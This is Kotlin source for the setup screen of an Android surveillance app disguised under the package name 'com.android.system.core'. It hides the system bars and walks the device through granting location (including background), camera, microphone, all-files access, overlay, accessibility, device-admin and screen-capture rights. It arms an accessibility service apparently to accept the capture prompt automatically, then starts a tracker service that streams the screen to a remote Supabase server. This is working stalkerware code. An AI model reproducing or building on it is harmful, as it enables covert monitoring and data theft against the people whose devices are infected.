package com.android.system.core

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.view.View
import android.widget.Button
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import androidx.core.content.edit
import androidx.core.graphics.toColorInt
import androidx.core.net.toUri
import androidx.core.view.WindowCompat
import androidx.core.view.WindowInsetsCompat
import androidx.core.view.WindowInsetsControllerCompat
import okhttp3.*
import java.io.IOException

class MainActivity : AppCompatActivity() {

    private lateinit var txtStatus: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var btnRetry: Button

    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    private var isSettingUp = false
    private var isTestingConnection = false
    private var isWaitingForResult = false

    private enum class SetupStep {
        NONE, CONNECTION, RUNTIME, BG_LOCATION, BATTERY, STORAGE, OVERLAY, ACCESSIBILITY, ADMIN, SCREEN_CAPTURE
    }
    private var currentStep = SetupStep.NONE

    private val runtimePermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) {
        isWaitingForResult = false
        checkNextSetupStep()
    }

    private val screenCaptureLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        isWaitingForResult = false
        if (result.resultCode == RESULT_OK && result.data != null) {
            TrackerService.screenCaptureIntent = result.data
            TrackerService.screenCaptureResultCode = result.resultCode
        }
        checkNextSetupStep()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Immersive full screen
        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
        windowInsetsController.systemBarsBehavior = WindowInsetsControllerCompat.BEHAVIOR_SHOW_TRANSIENT_BARS_BY_SWIPE
        windowInsetsController.hide(WindowInsetsCompat.Type.systemBars())

        txtStatus = findViewById(R.id.txtStatus)
        progressBar = findViewById(R.id.progressBar)
        btnRetry = findViewById(R.id.btnRetry)

        devicePolicyManager = getSystemService(DevicePolicyManager::class.java)
        adminComponent = ComponentName(this, SecurityAdminReceiver::class.java)

        btnRetry.setOnClickListener {
            btnRetry.visibility = View.GONE
            progressBar.visibility = View.VISIBLE
            isSettingUp = true
            isTestingConnection = false
            currentStep = SetupStep.NONE
            checkNextSetupStep()
        }

        isSettingUp = true
        
        // Remove the postDelayed to prevent duplicate initialization. 
        // onResume will handle the first invocation safely.
    }

    override fun onResume() {
        super.onResume()
        if (isSettingUp && !isTestingConnection && !isWaitingForResult) {
            checkNextSetupStep()
        }
    }

    private fun abortSetup(reason: String) {
        isSettingUp = false
        updateStatus("Setup paused: $reason")
        progressBar.visibility = View.GONE
        btnRetry.visibility = View.VISIBLE
    }

    private fun checkNextSetupStep() {
        if (!isSettingUp) return

        // 1. Connection Test
        if (!isConnectionTested) {
            if (currentStep == SetupStep.CONNECTION) return // Already testing
            currentStep = SetupStep.CONNECTION
            testConnection()
            return
        }

        // 2. Basic Runtime Permissions
        val missingRuntime = getMissingRuntimePermissions()
        if (missingRuntime.isNotEmpty()) {
            currentStep = SetupStep.RUNTIME
            updateStatus(getString(R.string.status_requesting_basic_perms))
            isWaitingForResult = true
            runtimePermissionsLauncher.launch(missingRuntime.toTypedArray())
            return
        }

        // 3. Background Location (Android 10+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q &&
            ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            if (currentStep != SetupStep.BG_LOCATION) {
                currentStep = SetupStep.BG_LOCATION
                updateStatus(getString(R.string.status_requesting_bg_location))
                Toast.makeText(this, R.string.toast_allow_bg_location, Toast.LENGTH_LONG).show()
            }
            val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                data = "package:$packageName".toUri()
            }
            startActivity(intent)
            return
        }

        // 4. Battery Optimization
        val powerManager = getSystemService(PowerManager::class.java)
        if (!powerManager.isIgnoringBatteryOptimizations(packageName)) {
            if (currentStep != SetupStep.BATTERY) {
                currentStep = SetupStep.BATTERY
                updateStatus(getString(R.string.status_disabling_battery_opt))
            }
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                data = "package:$packageName".toUri()
            }
            startActivity(intent)
            return
        }

        // 4.5 Manage External Storage (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!android.os.Environment.isExternalStorageManager()) {
                if (currentStep != SetupStep.STORAGE) {
                    currentStep = SetupStep.STORAGE
                    updateStatus(getString(R.string.status_requesting_storage))
                }
                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                    data = "package:$packageName".toUri()
                }
                startActivity(intent)
                return
            }
        }

        // 4.5.5 Display over other apps (System Alert Window)
        if (!Settings.canDrawOverlays(this)) {
            if (currentStep != SetupStep.OVERLAY) {
                currentStep = SetupStep.OVERLAY
                updateStatus(getString(R.string.status_requesting_overlay))
                Toast.makeText(this, R.string.toast_allow_overlay, Toast.LENGTH_LONG).show()
            }
            val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, "package:$packageName".toUri())
            startActivity(intent)
            return
        }

        // 4.6 Accessibility Service
        if (!isAccessibilityServiceEnabled()) {
            if (currentStep != SetupStep.ACCESSIBILITY) {
                currentStep = SetupStep.ACCESSIBILITY
                updateStatus(getString(R.string.status_requesting_accessibility))
                Toast.makeText(this, R.string.toast_enable_accessibility, Toast.LENGTH_LONG).show()
            }
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(intent)
            return
        }

        // 5. Device Admin
        if (!devicePolicyManager.isAdminActive(adminComponent)) {
            if (currentStep != SetupStep.ADMIN) {
                currentStep = SetupStep.ADMIN
                updateStatus(getString(R.string.status_requesting_admin))
            }
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, getString(R.string.admin_activation_explanation))
            }
            startActivity(intent)
            return
        }

        // 6. Screen Capture
        if (TrackerService.screenCaptureIntent == null) {
            currentStep = SetupStep.SCREEN_CAPTURE
            updateStatus(getString(R.string.status_requesting_screen_capture))
            
            AssistantAutomationService.armAutomation()

            isWaitingForResult = true
            val projectionManager = getSystemService(MediaProjectionManager::class.java)
            screenCaptureLauncher.launch(projectionManager.createScreenCaptureIntent())
            return
        }

        // ALL DONE! Start service
        isSettingUp = false
        currentStep = SetupStep.NONE
        startTrackingService()
    }

    private fun getMissingRuntimePermissions(): List<String> {
        val perms = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        return perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
    }

    private var isConnectionTested = false
    private fun testConnection() {
        isTestingConnection = true
        updateStatus(getString(R.string.status_testing_connection))
        
        val url = getString(R.string.default_supabase_url) + "/rest/v1/"
        val anonKey = getString(R.string.default_supabase_anon_key)
        val client = OkHttpClient()
        val request = Request.Builder()
            .url(url)
            .addHeader("apikey", anonKey)
            .addHeader("Authorization", "Bearer $anonKey")
            .build()

        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                runOnUiThread {
                    isTestingConnection = false
                    updateStatus(getString(R.string.status_connection_failed, e.message))
                    progressBar.visibility = View.GONE
                    btnRetry.visibility = View.VISIBLE
                }
            }
            override fun onResponse(call: Call, response: Response) {
                response.close()
                runOnUiThread {
                    isTestingConnection = false
                    isConnectionTested = true
                    checkNextSetupStep()
                }
            }
        })
    }

    private fun startTrackingService() {
        updateStatus(getString(R.string.status_starting_tracker))
        
        getSharedPreferences("TrackerPrefs", MODE_PRIVATE).edit {
            val androidId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
            val uniqueDeviceName = "${Build.MODEL}_$androidId"
            putString("DEVICE_NAME", uniqueDeviceName)
            putString("SUPABASE_URL", getString(R.string.default_supabase_url))
            putString("SUPABASE_ANON_KEY", getString(R.string.default_supabase_anon_key))
            putString("INTERVAL", "2") // Set default to 2s to avoid rate limiting
        }

        val intent = Intent(this, TrackerService::class.java)
        intent.action = "START_SCREEN_STREAM"
        intent.putExtra("FPS", 1)
        startForegroundService(intent)

        showActiveUI()
    }

    private fun showActiveUI() {
        progressBar.visibility = View.GONE
        btnRetry.visibility = View.GONE
        txtStatus.text = getString(R.string.status_tracking_active)
        txtStatus.setTextColor("#00FF9D".toColorInt())
    }

    private fun updateStatus(msg: String) {
        txtStatus.text = msg
        txtStatus.setTextColor("#AAAAAA".toColorInt())
    }

    private fun isAccessibilityServiceEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
        if (enabledServices.isNullOrEmpty()) return false
        
        val colonSplitter = android.text.TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        
        val myService = ComponentName(this, AssistantAutomationService::class.java)
        
        while (colonSplitter.hasNext()) {
            val componentNameString = colonSplitter.next()
            val enabledService = ComponentName.unflattenFromString(componentNameString)
            if (enabledService != null && enabledService == myService) {
                return true
            }
        }
        return false
    }
}
